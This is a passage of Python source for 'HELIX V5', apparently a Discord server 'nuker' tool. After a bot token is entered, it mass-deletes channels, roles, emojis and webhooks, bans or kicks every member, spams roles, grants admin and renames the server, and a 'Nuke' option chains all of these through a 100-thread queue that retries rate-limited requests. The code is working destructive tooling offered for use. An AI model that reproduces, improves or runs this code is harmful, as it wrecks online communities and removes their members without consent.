    def DeleteRolesMenu():
        os.system("cls")
        Run.start_deleting_roles()
        input()
        os.system("cls")
        if len(count)==1:
            println(color_info(f"Deleted: {len(count)} role"))
        else:
            println(color_info(f"Deleted: {len(count)} roles"))
        time.sleep(1)
        menu()
    @staticmethod
    def CreateRolesMenu():
        global rtxt
        os.system("cls & mode 80,20 & title HELIX V5 - Spam roles")
        print(f"""
{n(1)} Custom name
{n(2)} Random name
{n(3)} Exit to menu
""")
        choice = input(color_R("Choice: "))
        os.system("cls")
        if choice == '1':
            rtxt='Custom name'
            Run.start_spamming_roles()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Created: {len(count)} role"))
            else:
                println(color_info(f"Created: {len(count)} role"))
            time.sleep(1)
            RolesMenu.CreateRolesMenu()   
        elif choice=='2':
            rtxt='Random name'
            Run.start_spamming_roles()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Created: {len(count)} role"))
            else:
                println(color_info(f"Created: {len(count)} role"))
            time.sleep(1)
            RolesMenu.CreateRolesMenu()   
        elif choice=='3':
            menu()
        else:
            os.system("cls & title HELIX V5 - [!]")
            println(color_R("Invalid choice"))
            time.sleep(1)
            RolesMenu.CreateRolesMenu()
class Webhooks_Emojis:
    @staticmethod
    def DeleteEmojis():
        os.system("cls")
        Run.start_deleting_emojis()
        input()
        os.system("cls")
        if len(count)==1:
            println(color_info(f"Deleted: {len(count)} emoji"))
        else:
            println(color_info(f"Deleted: {len(count)} emojis"))
        time.sleep(1)
        menu()
    @staticmethod
    def DeleteWebhooks():
        os.system("cls")
        Run.start_deleting_webhooks()
        input()
        os.system("cls")
        if len(count)==1:
            println(color_info(f"Deleted: {len(count)} webhook"))
        else:
            println(color_info(f"Deleted: {len(count)} webhooks"))
        time.sleep(1)
        menu()
class MemberOptions:
    @staticmethod
    def memberOptions():
        global mtxt
        os.system("cls & mode 80,20 & title HELIX V5 - Member options")
        print(f"""
{n(1)} Kick members
{n(2)} Ban members
{n(3)} Change nick name
{n(4)} Exit to menu
""")   
        choice = input(color_R("Choice: "))
        os.system("cls")
        if choice == '1':
            os.system("cls")
            Run.start_kicking_members()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Kicked: {len(count)} member"))
            else:
                println(color_info(f"Kicked: {len(count)} members"))
            time.sleep(1)
            MemberOptions.memberOptions()
        elif choice == '2':
            os.system("cls")
            Run.start_banning_members()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Banned: {len(count)} member"))
            else:
                println(color_info(f"Banned: {len(count)} members"))
            time.sleep(1)
            MemberOptions.memberOptions()
        elif choice == '3':
            os.system("cls & title HELIX V5 - Member options[Change nickname]")
            print(f"""
{n(1)} Custom name
{n(2)} Random name
{n(3)} Exit to member options
""")        
            print()
            choice = input(color_R("Choice: "))
            os.system("cls")
            if choice == '1':
                mtxt='Custom name'
                Run.start_changing_nickname()
                input()
                os.system("cls")
                MemberOptions.memberOptions()
            elif choice == '2':
                mtxt='Random name'
                Run.start_changing_nickname()
                input()
                os.system("cls")
                MemberOptions.memberOptions()
            elif choice == '3':
                MemberOptions.memberOptions()
            else:
                os.system("cls & title HELIX V5 - [!]")
                println(color_W("Invalid choice"))
                time.sleep(1)
                MemberOptions.memberOptions()
        elif choice == '4':
            menu()
        else:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Invalid choice"))
            time.sleep(1)
            MemberOptions.memberOptions()
        
 

class ChangeTheme:
    @staticmethod
    def menu():
        os.system("cls & mode 45,10 & title HELIX V5 - Change theme")
        print(f"""
        
        {n(1)} Red      {n(5)} Blue
        {n(2)} Magenta  {n(6)} Yellow
        {n(3)} Green    {n(7)} Dark grey
        {n(4)} Cyan     {n(8)} Exit to menu 
        """)
        choice = input(color_R("Choice: "))
        os.system("cls")
        if choice == '1':
            Clrs.color_red()
        elif choice == '2':
            Clrs.color_magenta()
        elif choice == '3':
            Clrs.color_green()
        elif choice == '4':
            Clrs.color_cyan()
        elif choice == '5':
            Clrs.color_blue()
        elif choice == '6':
            Clrs.color_yellow()
        elif choice == '7':
            Clrs.color_grey()
        elif choice == '8':
            menu()
        else:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Invalid choice"))
            time.sleep(1)
            ChangeTheme.menu()
        
##########################################################################################################################################
##########################################################################################################################################
##########################################################################################################################################
##########################################################################################################################################
##########################################################################################################################################
 
concurrent = 100
q = queue.Queue(concurrent * 2)
def do_request():
    while True:
        request_method,request_url,response_headers,payload = q.get()
        try:
            r =  request_method(request_url,headers=response_headers)
            if r.status_code == 429:
                q.put((request_method,request_url,response_headers,payload))
        except:
            pass
        q.task_done()
for i in range(concurrent):
    threading.Thread(target=do_request,daemon=True).start()

def DeleteChannels_nuke():
    os.system("title HELIX V5 - Deleting channels...")
    try:
        channels = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/channels",headers=headers).json()
        for channel in channels:
            q.put((requests.delete,f"https://discord.com/api/v9/channels/{channel['id']}",headers,None))
        q.join()
    except:
        pass
def BanMembers_nuke():
    global BannedMembers
    os.system("title HELIX V5 - Banning members...")
    BannedMembers=0
    try:
        members = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/members?limit=1000",headers=headers).json()
        for member in members:
            q.put((requests.put,f"https://discord.com/api/v9/guilds/{server_id}/bans/{member['user']['id']}",headers,None))
        q.join()
    except:
        pass
def DeleteRoles_nuke():
    os.system("title HELIX V5 - Deleting roles...")
    try:
        roles = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/roles",headers=headers).json()
        for role in roles:
            q.put((requests.delete,f"https://discord.com/api/v9/guilds/{server_id}/roles/{role['id']}",headers,None))
        q.join()
    except:
        pass

def DeleteEmojis_nuke(): 
    os.system("title HELIX V5 - Deleting emojis...")
    try:
        emojis = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/emojis",headers=headers).json()
        for emoji in emojis:
            q.put((requests.delete,f"https://discord.com/api/v9/guilds/{server_id}/emojis/{emoji['id']}",headers,None))
        q.join()
    except:
        pass
def change_server_name():
    os.system('title HELIX V5 - Changing name...')
    try:
        payload={'name':'LMAO'}
        requests.patch(f"https://discord.com/api/v9/guilds/{server_id}",headers=headers,json=payload)
    except:
        pass
def Nuke():
        os.system("cls & title HELIX V5 - Nuke server")
        println(color_R("Are you sure?(y/n): "));question=input()
        os.system('cls')
        if question.casefold() == 'y':
            try:
                response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}",headers=headers)
            except requests.ConnectionError:
                time.sleep(0.5)
                os.system("cls & title HELIX V5 - [!]")
                println(color_W("Please check your internet connection and try again"))
                time.sleep(1)
                menu()
            except:
                menu()
            else:
                if response.status_code in [200,201,204]:
                    DeleteChannels_nuke()
                    BanMembers_nuke()
                    DeleteRoles_nuke()
                    DeleteEmojis_nuke()
                    change_server_name()
                    os.system("title HELIX V5 - Nuke server")
                    println(color_plus("Done"))
                    time.sleep(1)
                    menu()
                elif response.status_code in [400,403,404]:
                    os.system(f"cls & title HELIX V5 - [!]")
                    println
                    println(color_W("Please enter the server id"))
                    time.sleep(1)
                    menu()
                else:
                    os.system("cls & title HELIX V5 - [!]")
                    println(color_W("Error"))
                    time.sleep(1)
                    menu()
        else:
            menu()
##########################################################################################################################################
##########################################################################################################################################
##########################################################################################################################################
##########################################################################################################################################
##########################################################################################################################################
    
class OtherOptions:
    @staticmethod
    def DeleteChannel():
        os.system("cls & mode 80,20 & title HELIX V5 - Other options[Delete channel]")
        println(color_R("Channel id: "));channel_id=input()
        os.system("cls & title HELIX V5 - Checking id...")
        try:
            response = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                channels = response.json()
                if not channels:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 channels"))
                    time.sleep(1)
                    OtherOptions.options()
                else:
                    os.system("cls & title HELIX V5 - Other options[Delete channel]")
                    println(color_plus("Done"))
                    time.sleep(1)
                    OtherOptions.options()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - [!]")
                println(color_W("Invalid id"))
                time.sleep(1)
                OtherOptions.options()
            else:
                OtherOptions.options()
    @staticmethod
    def CreateChannel():
        os.system('cls & mode 80,20 & title HELIX V5 - Other options[Create channel]')
        println(color_R("Channel name: "));name = input()
        if name in ['']:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please enter the name"))
            time.sleep(1)
            OtherOptions.options()
        else:
            println(color_R("Type(0,2,4): "));channel_type = input()
            if channel_type not in ['0','2','4']:
                os.system("cls & title HELIX V5 - [!]")
                println(color_W("Invalid type"))
                time.sleep(1)
                OtherOptions.options()
            else:    
                os.system("cls")
                try:
                    payload = {'name':name,'type':channel_type}
                    response = requests.post(f"https://discord.com/api/v9/guilds/{server_id}/channels",headers=headers,json=payload)
                except requests.ConnectionError:
                    time.sleep(0.5)
                    os.system("cls & title HELIX V5 - [!]")
                    println(color_W("Please check your internet connection and try again"))
                    time.sleep(1)
                    menu()
                except:
                    menu()
                else:
                    if response.status_code in [200,201,204]:
                        os.system("cls")
                        println(color_plus("Done"))
                        time.sleep(1)
                        OtherOptions.options()
                    elif "Missing Permissions" in response.text:
                        os.system("cls & title HELIX V5 - [!]")
                        println(color_minus("Missing permissions"))
                        time.sleep(1)
                        OtherOptions.options()
                    elif response.status_code in [400,403,404]:
                        os.system(f"cls & title HELIX V5 - [!]")
                        println(color_W("Please enter the server id"))
                        time.sleep(1)
                        OtherOptions.options()
                    else:
                        OtherOptions.options()
    @staticmethod
    def DeleteRole():
        os.system("cls & mode 80,20 & title HELIX V5 - Other options[Delete role]")
        println(color_R("Role id: "));role_id=input()
        os.system("cls & title HELIX V5 - Checking id...")
        try:
            response = requests.delete(f"https://discord.com/api/v9/guilds/{server_id}/roles/{role_id}",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_R("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                role = response.json()
                if not role:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 roles"))
                else:  
                    os.system("cls & tilte HELIX V5 - Other options[Delete role]") 
                    println(color_plus("Done"))
                    time.sleep(1)
                    OtherOptions.options()
            elif "Missing Permissions" in response.text:
                os.system("cls & title HELIX V5 - [!]")
                println(color_minus("Missing permissions"))
                time.sleep(1)
                OtherOptions.options()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - [!]")
                println(color_W("Server id or role's id is not valid"))
                time.sleep(1)
                OtherOptions.options()
            else:
                OtherOptions.options()
    @staticmethod
    def CreateRole():
        os.system("cls & mode 80,20 & title HELIX V5 - Other options[Create role]")
        println(color_R("Role name: "));role_name=input()
        os.system("cls")
        if role_name in ['']:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please enter the name"))
            time.sleep(1)
            OtherOptions.options()
        else:
            try:
                payload={'name':role_name}
                response = requests.post(f"https://discord.com/api/v9/guilds/{server_id}/roles",headers=headers,json=payload)
            except requests.ConnectionError:
                time.sleep(0.5)
                os.system("cls & title HELIX V5 - [!]")
                println(color_R("Please check your internet connection and try again"))
                time.sleep(1)
                menu()
            except:
                menu()
            else:
                if response.status_code in [200,201,204]:
                    println(color_plus("Done"))
                    time.sleep(1)
                    OtherOptions.options()
                elif "Missing Permissions" in response.text:
                    os.system("cls & title HELIX V5 - [!]")
                    println(color_minus("Missing permissions"))
                    time.sleep(1)
                    OtherOptions.options()
                elif response.status_code in [400,403,404]:
                    os.system(f"cls & title HELIX V5 - [!]")
                    println(color_W("Please enter the server id"))
                    time.sleep(1)
                    OtherOptions.options()
                else:
                    OtherOptions.options()
    @staticmethod
    def KickMember():
        os.system("cls & mode 80,20 & title HELIX V5 - Other options[Kick member]")
        println(color_R("Member id: "));member_id=input()
        os.system("cls & title HELIX V5 - Checking id...")
        try:
            response = requests.delete(f"https://discord.com/api/v9/guilds/{server_id}/members/{member_id}",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_R("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                os.system("cls & tilte HELIX V5 - Other options[Kick member]") 
                println(color_plus("Done"))
                time.sleep(1)
                OtherOptions.options()
            elif "Missing Permissions" in response.text:
                os.system("cls & title HELIX V5 - [!]")
                println(color_minus("Missing permissions"))
                time.sleep(1)
                OtherOptions.options()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - [!]")
                println(color_W("Server id or member's id is not valid"))
                time.sleep(1)
                OtherOptions.options()
            else:
                OtherOptions.options()
    @staticmethod
    def BanMember():
        os.system("cls & mode 80,20 & title HELIX V5 - Other options[Ban member]")
        println(color_R("Member id: "));member_id=input()
        os.system("cls & title HELIX V5 - Checking id...")
        try:
            response = requests.put(f"https://discord.com/api/v9/guilds/{server_id}/bans/{member_id}",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_R("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                os.system("cls & tilte HELIX V5 - Other options[Ban member]") 
                println(color_plus("Done"))
                time.sleep(1)
                OtherOptions.options()
            elif "Missing Permissions" in response.text:
                os.system("cls & title HELIX V5 - [!]")
                println(color_minus("Missing permissions"))
                time.sleep(1)
                OtherOptions.options()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - [!]")
                println(color_W("Server id or member's id is not valid"))
                time.sleep(1)
                OtherOptions.options()
            else:
                OtherOptions.options()
    @staticmethod
    def opencmd():
        os.system("cls")
        os.system("start")
        time.sleep(0.5)
        OtherOptions.options()
    @staticmethod
    def info():
        os.system("cls & mode 80,20 & title HELIC V3 - Info ")
        print(color_R("Developer: HELINITY"))
        print(color_R("Created at: 6/10/2022"))
        print(color_R("Discord: HELINITY#3063"))
        print(color_R("Twitter: HELI_FN"))
        print()
        input(color_info("Press enter to continue"))
        OtherOptions.options()
         
    @staticmethod
    def options():
        os.system("cls & mode 60,10 & title HELIX V5 - Other options")
        print(f"""    
            {n(1)} Delete channel  {n(6)} Ban member
            {n(2)} Create channel  {n(7)} Open cmd
            {n(3)} Delete role     {n(8)} Info
            {n(4)} Create role     {n(9)} Exit to menu
            {n(5)} Kick member     {n(10)} Exit 
    """)
        choice = input(color_R("Choice: "))
        os.system('cls')
        if choice == '1':
            OtherOptions.DeleteChannel()
        elif choice == '2':
            OtherOptions.CreateChannel()
        elif choice == '3':
            OtherOptions.DeleteRole()
        elif choice == '4':
            OtherOptions.CreateRole()
        elif choice == '5':
            OtherOptions.KickMember()
        elif choice == '6':
            OtherOptions.BanMember()
        elif choice == '7':
            OtherOptions.opencmd()
        elif choice == '8':
            OtherOptions.info() 
        elif choice == '9':
            menu()
        elif choice == '10':
            os.system('cls & title HELIX V5')
            println(color_R("Are you sure?(y/n): "));question = input()
            os.system('cls')
            if question.casefold() =='y':
                println(color_R("Thanks for using :D"))
                time.sleep(1)
                os._exit(0)
            else:
                OtherOptions.options()
        else:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Invalid choice"))
            time.sleep(1)
            OtherOptions.options()


class WebbrowserOptions:
    def open_replit():
        wb.open('https://www.replit.com/~')
        time.sleep(1)
        WebbrowserOptions.webbrowserOptions()
    def open_github():
        wb.open('https://www.github.com/')
        time.sleep(1)
        WebbrowserOptions.webbrowserOptions()
    def open_developer_portal():
        wb.open('https://www.discord.com/developers/applications')
        time.sleep(1)
        WebbrowserOptions.webbrowserOptions()
    def open_discord():
        wb.open('https://www.discord.com') 
        time.sleep(1)
        WebbrowserOptions.webbrowserOptions()  
    def open_google():
        wb.open('https://google.com')
        time.sleep(1)
        WebbrowserOptions.webbrowserOptions()
    def search():
        os.system('cls')
        println(color_R('Link: '));link=input()
        wb.open(link)
        time.sleep(1)
        WebbrowserOptions.webbrowserOptions()
    def webbrowserOptions():
        os.system('cls & mode 63,10 & title Selected Option Webbrowser Option')
        print(f"""
        {n(1)} Open Google {n(2)} Open Replit  {n(3)} Open Discord
        {n(4)} Open DvP    {n(5)} Enter link   {n(6)} Exit to menu
        """)
        choice = input(color_R('Choice: '))
        os.system('cls')
        if choice == '1':
            WebbrowserOptions.open_google()
        elif choice == '2':
            WebbrowserOptions.open_replit()
        elif choice == '3':
            WebbrowserOptions.open_discord()
        elif choice == '4':
            WebbrowserOptions.open_developer_portal()
        elif choice == '5':
            WebbrowserOptions.search()
        elif choice == '6':
            menu()
        else:
            os.system('cls & title HELIX V5 - [!]')
            println(color_W("Invalid choice"))
            time.sleep(1)
            WebbrowserOptions.webbrowserOptions()

def n(num):
    return f"{color}[\033[1;37;40m{num}{color}]\033[1;37;40m"
def menu():
    try:
        requests.get("https://discord.com")
    except requests.ConnectionError:
        os.system(f"cls & mode 80,20 & title HELIX V5 - Main menu[Bad internet connection]")
    except:
        pass
    else:
        os.system(f"cls & mode 80,20 &title HELIX V5 - Main menu[{name}]")
    print(f"""{color}
                     ██╗  ██╗███████╗██╗     ██╗██╗  ██╗
                     ██║  ██║██╔════╝██║     ██║╚██╗██╔╝
                     ███████║█████╗  ██║     ██║ ╚███╔╝ 
                     ██╔══██║██╔══╝  ██║     ██║ ██╔██╗ 
                     ██║  ██║███████╗███████╗██║██╔╝ ██╗
                     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═╝

         {n(1)} Delete channels  {n(7)} Member options  {n(13)} Change theme
         {n(2)} Spam channels    {n(8)} Unban all       {n(14)} Other options
         {n(3)} Delete roles     {n(9)} Give admin      {n(15)} Webbrowser options
         {n(4)} Spam roles       {n(10)} Nuke server    {n(16)} Enter server id
         {n(5)} Delete emojis    {n(11)} Change name    {n(17)} Change token
         {n(6)} Delete webhooks  {n(12)} Server info    {n(18)} Exit                                      
    """)
    choice = input(color_R("Choice: "))
    os.system("cls")
    if choice == "1":
        ChannelsMenu.DeleteChannelsMenu()
    elif choice == "2":
        ChannelsMenu.SpamChannelsMenu()
    elif choice == "3":
        RolesMenu.DeleteRolesMenu()
    elif choice == '4':
        RolesMenu.CreateRolesMenu()
    elif choice == '5':
        Webhooks_Emojis.DeleteEmojis()
    elif choice == '6':
        Webhooks_Emojis.DeleteWebhooks()
    elif choice == '7':
        MemberOptions.memberOptions()
    elif choice=='8':
        Run.start_unbanning_all()
        input()
        os.system("cls")
        if len(count)==1:
            println(color_info(f"Unbanned: {len(count)} user"))
        else:
            println(color_info(f"Unbanned: {len(count)} users"))
        time.sleep(1)
        menu()
    elif choice=='9':
        Run.GiveAdmin()
    elif choice=='10':
        Nuke()
    elif choice=='11':
        Run.change_name()
    elif choice == '12':
        Run.ServerInfo()
    elif choice == '13':
        ChangeTheme.menu()
    elif choice == '14':
        OtherOptions.options()
    elif choice == '15':
        WebbrowserOptions.webbrowserOptions()


    elif choice == "16":
        enter_server_id()      
        
    elif choice == "17":
        token_entry()
    elif choice == "18":
        os.system('cls & title HELIX V5')
        println(color_R("Are you sure?(y/n): "));question = input()
        if question.casefold() =='y':
            os.system('cls')
            println(color_R("Thanks for using :D"))
            time.sleep(1)
            os._exit(0)
        else:
            menu()
    else:
        os.system('cls & title HELIX V5 - [!]')
        println(color_W("Invalid choice"))
        time.sleep(1)
        menu()
             
def token_entry():
    global  token,headers,name
    os.system("cls & mode 80,20 &title HELIX V5 - Login information")
    try:
        println(color_R("Bot's token: "));token = input()
        os.system("cls")
    except Exception as e:
        print(color_W(e))
        time.sleep(1)
        token_entry()
    else:
        try:
            headers={"Authorization":f"Bot {token}"}
            os.system('cls & title HELIX V5 - Checking token...')
            r = requests.get("https://discord.com/api/v9/users/@me",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system('cls & title HELIX V5 - Failed to connect')
            println(color_W('Please check your internet connection and try again'))
            time.sleep(1)
            token_entry()
        except Exception as e:
            os.system("cls")
            print(color_W(e))
            time.sleep(1)
            token_entry()
        else:
            if r.status_code == 200:
                name = f"{r.json()['username']}#{r.json()['discriminator']}"
                os.system(f"cls & title HELIX V5 - Connected: {name}")
                println(color_R(f"Logged in {name}"))
                time.sleep(1)
                menu()
            else:
                os.system('cls & title HELIX V5 - Failed to connect')
                println(color_W("Invalid token"))
                time.sleep(1)
                token_entry()
        
token_entry()
 
 